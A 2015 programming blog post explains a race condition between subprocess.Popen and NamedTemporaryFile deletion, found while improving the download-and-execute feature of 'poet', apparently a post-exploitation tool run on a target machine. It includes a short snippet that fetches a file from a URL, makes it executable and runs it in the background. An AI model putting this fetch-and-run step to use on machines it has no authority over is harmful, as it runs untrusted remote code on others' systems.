---
layout: post
title: "Off to the (Python Internals) Races"
date: 2015-06-07
comments: true
categories: programming python
---

This post is about an interesting race condition bug I ran into when working
on a small feature improvement for
[poet](http://github.com/mossberg/poet) a while ago
that I thought was
worth writing a blog post about.

In particular, I was improving the download-and-execute capability of poet
which, if you couldn't tell, downloads a file from the internet and executes
it on the target. At the original time of writing, I didn't know about
the python `tempfile` module and since I recently learned about it, I wanted
to integrate it into poet as it would be a significant improvement to
the original implementation. The initial patch looked like this.

```python
r = urllib2.urlopen(inp.split()[1])
with tempfile.NamedTemporaryFile() as f:
    f.write(r.read())
    os.fchmod(f.fileno(), stat.S_IRWXU)
    f.flush()  # ensure that file was actually written to disk
    sp.Popen(f.name, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
```

This code downloads a file from the internet, writes it to a tempfile on
disk, sets the permissions to executable, executes it in a subprocess.
In testing this code, I observed some puzzling behavior: the file was
never actually getting executed because it was suddenly ceasing to
exist! I noticed though that when I used
`subprocess.call()` or used `.wait()` on the `Popen()`, it would work
fine, however I intentionally didn't want the client to block while the
file executed its arbitrary payload, so I couldn't use those functions.

The fact that the execution would work when the `Popen` call waited for
the process and didn't work otherwise suggests that there was something
going on between the time it took to execute the child and the time it took
for the `with` block to end and delete the file, which is `tempfile`'s
default behavior. More specifically, the
file must have been deleted at some point before the `exec` syscall loaded
the file from disk into memory. Let's take a look at the implementation of
`subprocess.Popen()` to see if we can gain some more insight:

```python
def _execute_child(self, args, executable, preexec_fn, close_fds,
                           cwd, env, universal_newlines,
                           startupinfo, creationflags, shell, to_close,
                           p2cread, p2cwrite,
                           c2pread, c2pwrite,
                           errread, errwrite):
            """Execute program (POSIX version)"""

            <snip>

            try:
                try:
                    <snip>
                    try:
                        self.pid = os.fork()
                    except:
                        if gc_was_enabled:
                            gc.enable()
                        raise
                    self._child_created = True
                    if self.pid == 0:
                        # Child
                        try:
                            # Close parent's pipe ends
                            if p2cwrite is not None:
                                os.close(p2cwrite)
                            if c2pread is not None:
                                os.close(c2pread)
                            if errread is not None:
                                os.close(errread)
                            os.close(errpipe_read)

                            # When duping fds, if there arises a situation
                            # where one of the fds is either 0, 1 or 2, it
                            # is possible that it is overwritten (#12607).
                            if c2pwrite == 0:
                                c2pwrite = os.dup(c2pwrite)
                            if errwrite == 0 or errwrite == 1:
                                errwrite = os.dup(errwrite)

                            # Dup fds for child
                            def _dup2(a, b):
                                # dup2() removes the CLOEXEC flag but
                                # we must do it ourselves if dup2()
                                # would be a no-op (issue #10806).
                                if a == b:
                                    self._set_cloexec_flag(a, False)
                                elif a is not None:
                                    os.dup2(a, b)
                            _dup2(p2cread, 0)
                            _dup2(c2pwrite, 1)
                            _dup2(errwrite, 2)

                            # Close pipe fds.  Make sure we don't close the
                            # same fd more than once, or standard fds.
                            closed = { None }
                            for fd in [p2cread, c2pwrite, errwrite]:
                                if fd not in closed and fd > 2:
                                    os.close(fd)
                                    closed.add(fd)

                            if cwd is not None:
                                os.chdir(cwd)

                            if preexec_fn:
                                preexec_fn()

                            # Close all other fds, if asked for - after
                            # preexec_fn(), which may open FDs.
                            if close_fds:
                                self._close_fds(but=errpipe_write)

                            if env is None:
                                os.execvp(executable, args)
                            else:
                                os.execvpe(executable, args, env)

                        except:
                            exc_type, exc_value, tb = sys.exc_info()
                            # Save the traceback and attach it to the exception object
                            exc_lines = traceback.format_exception(exc_type,
                                                                   exc_value,
                                                                   tb)
                            exc_value.child_traceback = ''.join(exc_lines)
                            os.write(errpipe_write, pickle.dumps(exc_value))

                        # This exitcode won't be reported to applications, so it
                        # really doesn't matter what we return.
                        os._exit(255)

                    # Parent
                    if gc_was_enabled:
                        gc.enable()
                finally:
                    # be sure the FD is closed no matter what
                    os.close(errpipe_write)

                # Wait for exec to fail or succeed; possibly raising exception
                # Exception limited to 1M
                data = _eintr_retry_call(os.read, errpipe_read, 1048576)

                <snip>
```

The `_execute_child()` function is called by the `subprocess.Popen` class
constructor and implements child process execution. There's a lot of
code here, but key parts to notice here are the `os.fork()` call which
creates the child process, and the relative lengths of the following
`if` blocks. The check `if self.pid == 0` contains the code for executing
the child process and is significantly more involved than the code
for handling the parent process.

From this, we can deduce that when the `subprocess.Popen()` call executes
in my code, after forking, while the child is preparing to call
`os.execve`, the parent simply returns, and immediately exits the `with`
block. This automatically invokes the `f.close()` function which deletes
the temp file. By the time the child calls `os.execve`, the file has been
deleted on disk. Oops.

I fixed this by adding the `delete=False` argument to the
`NamedTemporaryFile` constructor to suppress the auto-delete functionality.
Of course this means that the downloaded files will have to be cleaned up
manually, but this allows the client to not block when executing the file
and have the code still be pretty clean.

Main takeaway here: don't try to `Popen` a `NamedTemporaryFile` as the
last statement in the tempfile's `with` block.
